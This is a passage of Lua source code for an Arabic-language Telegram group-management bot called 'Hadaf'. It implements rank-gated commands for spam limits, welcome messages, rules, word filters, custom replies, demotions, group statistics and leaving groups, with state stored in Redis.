elseif text and text:match("^وضع تكرار (%d+)$") and Admin(msg) then   
redis:hset(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,text:match("^وضع تكرار (%d+)$")) 
send(msg.chat_id_, msg.id_,"📮┇تم وضع عدد التكرار : "..text:match("^وضع تكرار (%d+)$").."")  
elseif text and text:match("^وضع زمن التكرار (%d+)$") and Admin(msg) then   
redis:hset(bot_id.."Hadaf:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,text:match("^وضع زمن التكرار (%d+)$")) 
send(msg.chat_id_, msg.id_,"📮┇تم وضع زمن التكرار : "..text:match("^وضع زمن التكرار (%d+)$").."") 
elseif text == "ضع رابط" and Admin(msg) or text == "وضع رابط" and Admin(msg) then
send(msg.chat_id_,msg.id_,"📮┇ارسل رابط المجموعه او رابط قناة المجموعه")
redis:setex(bot_id.."Hadaf:link:set"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
elseif text and text:match("^ضع صوره") and Admin(msg) and msg.reply_to_message_id_ == 0 or text and text:match("^وضع صوره") and Admin(msg) and msg.reply_to_message_id_ == 0 then  
redis:set(bot_id.."Hadaf:Set:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_,true) 
send(msg.chat_id_,msg.id_,"🌄┇ارسل الصوره لوضعها") 
elseif text == "ضع وصف" and Admin(msg) or text == "وضع وصف" and Admin(msg) then  
redis:setex(bot_id.."Hadaf:Change:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_,msg.id_,"📮┇ارسل الان الوصف")
elseif text == "ضع ترحيب" and Admin(msg) or text == "وضع ترحيب" and Admin(msg) then  
redis:setex(bot_id.."Hadaf:Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_,msg.id_,"📮┇ارسل لي الترحيب الان".."\n📫┇تستطيع اضافة مايلي !\n👤┇دالة عرض الاسم »{`name`}\n📌┇دالة عرض المعرف »{`user`}") 
elseif text == "ضع قوانين" and Admin(msg) or text == "وضع قوانين" and Admin(msg) then 
redis:setex(bot_id.."Hadaf:Redis:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_,"📮┇ارسل لي القوانين الان")  
elseif text == 'وضع كليشه المطور' and Dev_Hadaf(msg) then
redis:set(bot_id..'Hadaf:GetTexting:DevHadaf'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'📮┇ ارسل لي الكليشه الان')
elseif text and text:match("^ضع اسم (.*)") and Owner(msg) or text and text:match("^وضع اسم (.*)") and Owner(msg) then 
local Name = text:match("^ضع اسم (.*)") or text:match("^وضع اسم (.*)") 
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"⚠️┇ البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⚠️┇ ليست لدي صلاحية تغيير اسم المجموعه")  
else
send(msg.chat_id_,msg.id_,"🔘┇ تم تغيير اسم المجموعه الى {["..Name.."]}")  
end
end,nil) 
elseif text == "الرابط" then 
local status_Link = redis:get(bot_id.."Hadaf:Link_Group"..msg.chat_id_)
if not status_Link then
send(msg.chat_id_, msg.id_,"✅┇جلب الرابط معطل") 
return false  
end
local link = redis:get(bot_id.."Hadaf:link:set:Group"..msg.chat_id_)            
if link then                              
send(msg.chat_id_,msg.id_,"📮┇ Link Chat :\n ["..link.."]")                          
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
send(msg.chat_id_,msg.id_,"📮┇ Link Chat :\n ["..linkgpp.result.."]")                          
else
send(msg.chat_id_, msg.id_,"⚠️┇لا يوجد رابط للمجموعه")              
end            
end
elseif text == "الترحيب" and Admin(msg) then 
if redis:get(bot_id.."Hadaf:Get:Welcome:Group"..msg.chat_id_)   then 
Welcome = redis:get(bot_id.."Hadaf:Get:Welcome:Group"..msg.chat_id_)  
else 
Welcome = "⛔┇لم يتم تعيين ترحيب للمجموعه"
end 
send(msg.chat_id_, msg.id_,"["..Welcome.."]") 
elseif text == "مسح قائمه المنع" and Admin(msg) then   
local list = redis:smembers(bot_id.."Hadaf:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
redis:del(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_)  
redis:del(bot_id.."Hadaf:Filter:Reply2"..v..msg.chat_id_)  
redis:srem(bot_id.."Hadaf:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_,"✅┇تم مسح قائمه المنع")  
elseif text == "قائمه المنع" and Admin(msg) then   
local list = redis:smembers(bot_id.."Hadaf:List:Filter"..msg.chat_id_)  
t = "\n⛔┇قائمة المنع \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do  
local FilterMsg = redis:get(bot_id.."Hadaf:Filter:Reply2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..FilterMsg.."}\n"    
end  
if #list == 0 then  
t = "📬┇لا يوجد كلمات ممنوعه"  
end  
send(msg.chat_id_, msg.id_,t)  
elseif text and text == "منع" and msg.reply_to_message_id_ == 0 and Admin(msg) then       
send(msg.chat_id_, msg.id_,"📛┇ارسل الكلمه لمنعها")  
redis:set(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_,"SetFilter")  
return false  
elseif text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Admin(msg) then    
send(msg.chat_id_, msg.id_,"🔖┇ارسل الكلمه الان")  
redis:set(bot_id.."Hadaf:Filter:Reply1"..msg.sender_user_id_..msg.chat_id_,"DelFilter")  
return false  
elseif text == ("كشف البوتات") and Admin(msg) then  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = "\n⛔┇قائمة البوتات \n━━━━━━━━━━━━━\n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
tr = ""
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
tr = " {★}"
end
text = text..": [@"..ta.username_.."]"..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, "⚠️┇لا توجد بوتات في المجموعه")
return false 
end
if #admins == i then 
local a = "\n━━━━━━━━━━━━━\n🔖┇عدد البوتات التي هنا : "..n.." بوت"
local f = "\n👮┇عدد البوتات التي هي ادمن : "..t.."\n⚠️┇ملاحضه علامة النجمه يعني البوت ادمن - ★ \n"
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
elseif text == "القوانين" then 
local Set_Rules = redis:get(bot_id.."Hadaf::Rules:Group" .. msg.chat_id_)   
if Set_Rules then     
send(msg.chat_id_,msg.id_, Set_Rules)   
else      
send(msg.chat_id_, msg.id_,"⚠️┇لا توجد قوانين هنا")   
end    
elseif text == "اضف امر" and Constructor(msg) then
redis:set(bot_id.."Hadaf:Command:Reids:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"⚡┇الان ارسل لي الامر القديم ...")  
elseif text == "حذف امر" and Constructor(msg) or text == "مسح امر" and Constructor(msg) then 
redis:set(bot_id.."Hadaf:Command:Reids:Group:Del"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"⤵┇ارسل الان الامر الذي قمت بوضعه مكان الامر القديم")  
elseif text and text:match("^مسح صلاحيه (.*)$") and Admin(msg) or text and text:match("^حذف صلاحيه (.*)$") and Admin(msg) then 
local ComdNew = text:match("^مسح صلاحيه (.*)$") or text:match("^حذف صلاحيه (.*)$")
redis:del(bot_id.."Hadaf:Add:Validity:Group:Rt"..ComdNew..msg.chat_id_)
redis:srem(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_,ComdNew)  
send(msg.chat_id_, msg.id_, "\n✅┇تم مسح ← { "..ComdNew..' } من الصلاحيات') 
elseif text and text:match("^اضف صلاحيه (.*)$") and Admin(msg) then 
local ComdNew = text:match("^اضف صلاحيه (.*)$")
redis:set(bot_id.."Hadaf:Add:Validity:Group:Rt:New"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
redis:sadd(bot_id.."Hadaf:Validitys:Group"..msg.chat_id_,ComdNew)  
redis:setex(bot_id.."Hadaf:Redis:Validity:Group"..msg.chat_id_..""..msg.sender_user_id_,200,true)  
send(msg.chat_id_, msg.id_, "\n⚠️️┇ارسل نوع الصلاحيه كما مطلوب منك :\n💢┇انواع الصلاحيات المطلوبه ← { عضو ، مميز  ، ادمن  ، مدير }") 
elseif text and text:match("^تغيير رد المطور (.*)$") and Owner(msg) then
local Teext = text:match("^تغيير رد المطور (.*)$") 
redis:set(bot_id.."Hadaf:Developer:Bot:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⚠️️┇ تم تغيير رد المطور الى :"..Teext)
elseif text and text:match("^تغيير رد المنشئ الاساسي (.*)$") and Owner(msg) then
local Teext = text:match("^تغيير رد المنشئ الاساسي (.*)$") 
redis:set(bot_id.."Hadaf:President:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⚠️️┇ تم تغيير رد المنشئ الاساسي الى :"..Teext)
elseif text and text:match("^تغيير رد المنشئ (.*)$") and Owner(msg) then
local Teext = text:match("^تغيير رد المنشئ (.*)$") 
redis:set(bot_id.."Hadaf:Constructor:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⚠️️┇ تم تغيير رد المنشئ الى :"..Teext)
elseif text and text:match("^تغيير رد المدير (.*)$") and Owner(msg) then
local Teext = text:match("^تغيير رد المدير (.*)$") 
redis:set(bot_id.."Hadaf:Manager:Group:Reply"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_,"⚠️️┇ تم تغيير رد المدير الى :"..Teext)
elseif text and text:match("^تغيير رد الادمن (.*)$") and Owner(msg) then
local Teext = text:match("^تغيير رد الادمن (.*)$") 
redis:set(bot_id.."Hadaf:Admin:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⚠️️┇ تم تغيير رد الادمن الى :"..Teext)
elseif text and text:match("^تغيير رد المميز (.*)$") and Owner(msg) then
local Teext = text:match("^تغيير رد المميز (.*)$") 
redis:set(bot_id.."Hadaf:Vip:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⚠️️┇ تم تغيير رد المميز الى :"..Teext)
elseif text and text:match("^تغيير رد العضو (.*)$") and Owner(msg) then
local Teext = text:match("^تغيير رد العضو (.*)$") 
redis:set(bot_id.."Hadaf:Mempar:Group:Reply"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"⚠️️┇ تم تغيير رد العضو الى :"..Teext)
elseif text == 'حذف رد المطور' and Owner(msg) then
redis:del(bot_id.."Hadaf:Developer:Bot:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"✅┇تم حدف رد المطور")
elseif text == 'حذف رد المنشئ الاساسي' and Owner(msg) then
redis:del(bot_id.."Hadaf:President:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"✅┇تم حذف رد المنشئ الاساسي ")
elseif text == 'حذف رد المنشئ' and Owner(msg) then
redis:del(bot_id.."Hadaf:Constructor:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"✅┇تم حذف رد المنشئ ")
elseif text == 'حذف رد المدير' and Owner(msg) then
redis:del(bot_id.."Hadaf:Manager:Group:Reply"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"✅┇تم حذف رد المدير ")
elseif text == 'حذف رد الادمن' and Owner(msg) then
redis:del(bot_id.."Hadaf:Admin:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"✅┇تم حذف رد الادمن ")
elseif text == 'حذف رد المميز' and Owner(msg) then
redis:del(bot_id.."Hadaf:Vip:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"✅┇تم حذف رد المميز")
elseif text == 'حذف رد العضو' and Owner(msg) then
redis:del(bot_id.."Hadaf:Mempar:Group:Reply"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"✅┇تم حذف رد العضو")
elseif text == ("مسح الردود") and Owner(msg) then
local list = redis:smembers(bot_id.."Hadaf:List:Manager"..msg.chat_id_.."")
for k,v in pairs(list) do
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Gif"..v..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Vico"..v..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Text"..v..msg.chat_id_)   
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Photo"..v..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Video"..v..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:File"..v..msg.chat_id_)
redis:del(bot_id.."Hadaf:Add:Rd:Manager:Audio"..v..msg.chat_id_)
redis:del(bot_id.."Hadaf:List:Manager"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"✅┇تم مسح قائمه الردود")
elseif text == ("الردود") and Owner(msg) then
local list = redis:smembers(bot_id.."Hadaf:List:Manager"..msg.chat_id_.."")
text = "📑┇قائمه الردود \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
if redis:get(bot_id.."Hadaf:Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = "متحركه 🎭"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = "بصمه 📢"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = "ملصق 🃏"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = "رساله ✉"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = "صوره 🎇"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = "فيديو 📹"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Manager:File"..v..msg.chat_id_) then
db = "ملف 📁"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = "مقطع صوتي 🎵"
end
text = text..""..k.." » {"..v.."} » {"..db.."}\n"
end
if #list == 0 then
text = "⚠️┇عذرًا لا يوجد ردود في المجموعه"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
elseif text == "اضف رد" and Owner(msg) then
send(msg.chat_id_, msg.id_,"📮┇ارسل الان الكلمه لاضافتها في الردود")
redis:set(bot_id.."Hadaf:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
elseif text == "حذف رد" and Owner(msg) then
send(msg.chat_id_, msg.id_,"📮┇ارسل الان الكلمه لحذفها من الردود")
redis:set(bot_id.."Hadaf:Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
elseif text == ("مسح ردود العام") and Dev_Hadaf(msg) then 
local list = redis:smembers(bot_id.."Hadaf:List:Rd:Sudo")
for k,v in pairs(list) do
redis:del(bot_id.."Hadaf:Add:Rd:Sudo:Gif"..v)   
redis:del(bot_id.."Hadaf:Add:Rd:Sudo:vico"..v)   
redis:del(bot_id.."Hadaf:Add:Rd:Sudo:stekr"..v)     
redis:del(bot_id.."Hadaf:Add:Rd:Sudo:Text"..v)   
redis:del(bot_id.."Hadaf:Add:Rd:Sudo:Photo"..v)
redis:del(bot_id.."Hadaf:Add:Rd:Sudo:Video"..v)
redis:del(bot_id.."Hadaf:Add:Rd:Sudo:File"..v)
redis:del(bot_id.."Hadaf:Add:Rd:Sudo:Audio"..v)
redis:del(bot_id.."Hadaf:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"✅┇تم حذف ردود العام")
elseif text == ("ردود العام") and Dev_Hadaf(msg) then 
local list = redis:smembers(bot_id.."Hadaf:List:Rd:Sudo")
text = "\n📝┇قائمة ردود العام \n━━━━━━━━━━━━━\n"
for k,v in pairs(list) do
if redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Gif"..v) then
db = "متحركه 🎭"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Sudo:vico"..v) then
db = "بصمه 📢"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Sudo:stekr"..v) then
db = "ملصق 🃏"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Text"..v) then
db = "رساله ✉"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Photo"..v) then
db = "صوره 🎇"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Video"..v) then
db = "فيديو 📹"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Sudo:File"..v) then
db = "ملف 📁"
elseif redis:get(bot_id.."Hadaf:Add:Rd:Sudo:Audio"..v) then
db = "مقطع صوتي 🎵"
end
text = text..""..k.." » {"..v.."} » {"..db.."}\n"
end
if #list == 0 then
text = "⚠️┇لا توجد ردود عام"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
elseif text == "اضف رد عام" and Dev_Hadaf(msg) then 
send(msg.chat_id_, msg.id_,"📮┇ارسل الان الكلمه لاضافتها في ردود العام ")
redis:set(bot_id.."Hadaf:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
elseif text == "حذف رد عام" and Dev_Hadaf(msg) then 
send(msg.chat_id_, msg.id_,"📮┇ارسل الان الكلمه لحذفها من ردود العام")
redis:set(bot_id.."Hadaf:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
end
if text and text:match("^تنزيل الكل @(.*)$") and Owner(msg) then
print('&&&')
function FunctionStatus(extra, result, success)
if (result.id_) then
if Dev_Hadaf_User(result.id_) == true then
send(msg.chat_id_, msg.id_,"⚠️┇ لا تستطيع تنزيل المطور الاساسي")
return false 
end
if redis:sismember(bot_id.."Hadaf:Developer:Bot",result.id_) then
dev = "المطور ،" else dev = "" end
if redis:sismember(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.id_) then
crr = "منشئ اساسي ،" else crr = "" end
if redis:sismember(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, result.id_) then
cr = "منشئ ،" else cr = "" end
if redis:sismember(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.id_) then
own = "مدير ،" else own = "" end
if redis:sismember(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.id_) then
mod = "ادمن ،" else mod = "" end
if redis:sismember(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.id_) then
vip = "مميز ،" else vip = ""
end
if Rank_Checking(result.id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n🔖┇تم تنزيل الشخص من الرتب التاليه \n📥┇ { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n🚸┇ليس لديه رتب حتى استطيع تنزيله \n")
end
if Dev_Hadaf_User(msg.sender_user_id_) == true then
redis:srem(bot_id.."Hadaf:Developer:Bot", result.id_)
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_,result.id_)
redis:srem(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.id_)
elseif redis:sismember(bot_id.."Hadaf:Developer:Bot",msg.sender_user_id_) then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_,result.id_)
elseif redis:sismember(bot_id.."Hadaf:President:Group"..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, result.id_)
elseif redis:sismember(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.id_)
elseif redis:sismember(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.id_)
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, FunctionStatus, nil)
end
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Owner(msg) then
function Function_Status(extra, result, success)
if Dev_Hadaf_User(result.sender_user_id_) == true then
send(msg.chat_id_, msg.id_,"⚠️┇ لا تستطيع تنزيل المطور الاساسي")
return false 
end
if redis:sismember(bot_id.."Hadaf:Developer:Bot",result.sender_user_id_) then
dev = "المطور ،" else dev = "" end
if redis:sismember(bot_id.."Hadaf:President:Group"..msg.chat_id_, result.sender_user_id_) then
crr = "منشئ اساسي ،" else crr = "" end
if redis:sismember(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, result.sender_user_id_) then
cr = "منشئ ،" else cr = "" end
if redis:sismember(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.sender_user_id_) then
own = "مدير ،" else own = "" end
if redis:sismember(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.sender_user_id_) then
mod = "ادمن ،" else mod = "" end
if redis:sismember(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.sender_user_id_) then
vip = "مميز ،" else vip = ""
end
if Rank_Checking(result.sender_user_id_,msg.chat_id_) ~= false then
send(msg.chat_id_, msg.id_,"\n🔖┇تم تنزيل الشخص من الرتب التاليه \n📥┇ { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n🚸┇ليس لديه رتب حتى استطيع تنزيله \n")
end
if Dev_Hadaf_User(msg.sender_user_id_) == true then
redis:srem(bot_id.."Hadaf:Developer:Bot", result.sender_user_id_)
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_,result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember(bot_id.."Hadaf:Developer:Bot",msg.sender_user_id_) then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id.."Hadaf:President:Group"..msg.chat_id_,result.sender_user_id_)
elseif redis:sismember(bot_id.."Hadaf:President:Group"..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember(bot_id..'Hadaf:Constructor:Group'..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, result.sender_user_id_)
elseif redis:sismember(bot_id..'Hadaf:Manager:Group'..msg.chat_id_, msg.sender_user_id_) then
redis:srem(bot_id..'Hadaf:Admin:Group'..msg.chat_id_, result.sender_user_id_)
redis:srem(bot_id..'Hadaf:Vip:Group'..msg.chat_id_, result.sender_user_id_)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Status, nil)
elseif text == "رتبتي" then
local rtp = Get_Rank(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,"⚡┇ رتبتك في البوت : "..rtp)
elseif text == "اسمي"  then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_  then
first_name = "👤┇ اسمك الاول : `"..(result.first_name_).."`"
else
first_name = ""
end   
if result.last_name_ then 
last_name = "👤┇ اسمك الثاني ← : `"..result.last_name_.."`" 
else
last_name = ""
end      
send(msg.chat_id_, msg.id_,first_name.."\n"..last_name) 
end,nil)
elseif text==("عدد القروب") and Admin(msg) then  
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_,"⚠️┇ البوت ليس ادمن هنا \n") 
return false  
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
local taha = "👮┇ عدد الادمنيه : "..data.administrator_count_..
"\n🚯┇ عدد المطرودين : "..data.kicked_count_..
"\n👥┇ عدد الاعضاء : "..data.member_count_..
"\n📨┇ عدد رسائل القروب : "..(msg.id_/2097152/0.5)..
"\n⚠️️┇ اسم المجموعه : ["..ta.title_.."]"
send(msg.chat_id_, msg.id_, taha) 
end,nil)end,nil)
elseif text == "غادر" then 
if DeveloperBot(msg) and not redis:get(bot_id.."Hadaf:Lock:Left"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,"📫┇ تم مغادرة المجموعه") 
redis:srem(bot_id.."Hadaf:ChekBotAdd",msg.chat_id_)  
end
elseif text and text:match("^غادر (-%d+)$") then
local GP_ID = {string.match(text, "^(غادر) (-%d+)$")}
if DeveloperBot(msg) and not redis:get(bot_id.."Hadaf:Lock:Left"..msg.chat_id_) then 
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=GP_ID[2],user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
send(msg.chat_id_, msg.id_,"📫┇ تم مغادرة المجموعه") 
send(GP_ID[2], 0,"📫┇ تم مغادرة المجموعه بامر من مطور البوت") 
redis:srem(bot_id.."Hadaf:ChekBotAdd",GP_ID[2])  
end
elseif text == (redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف") then
local namebot = {
--"عمر "..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف").. " شتريد؟",
--"أჂ̤ أჂ̤ هياتني اني",
--"موجود بس لتصيح",
"لبيه",
--"راح نموت بكورونا وانت لسّه تنادي "..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف"),
--'يمعود والله نعسان'
}
name = math.random(#namebot)
send(msg.chat_id_, msg.id_, namebot[name]) 
elseif text == "بوت" then
print('&&&')
local BotName = {
--"باوع لك خليني احبك وصيحلي باسمي "..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف").. "",
--"لتخليني ارجع لحركاتي لقديمه وردا ترا اسمي "..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف").. "",
"راح نموت بكورونا وانت ماحفظت اسمي، اسمي "..(redis:get(bot_id.."Hadaf:Redis:Name:Bot") or "هدف").. ""
}
BotNameText = math.random(#BotName)
send(msg.chat_id_, msg.id_,BotName[BotNameText]) 
elseif text == "تغيير اسم البوت" and Dev_Hadaf(msg) or text == "تغيير اسم البوت" and Dev_Hadaf(msg) then 
redis:setex(bot_id.."Hadaf:Change:Name:Bot"..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"📫┇ ارسل لي الاسم الان ")  
elseif text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and DeveloperBot(msg) then 
if redis:get(bot_id.."Hadaf:Broadcasting:Bot") and not Dev_Hadaf(msg) then 
send(msg.chat_id_, msg.id_,"✅┇تم تعطيل الاذاعه من قبل المطور الاساسي !")
return false end
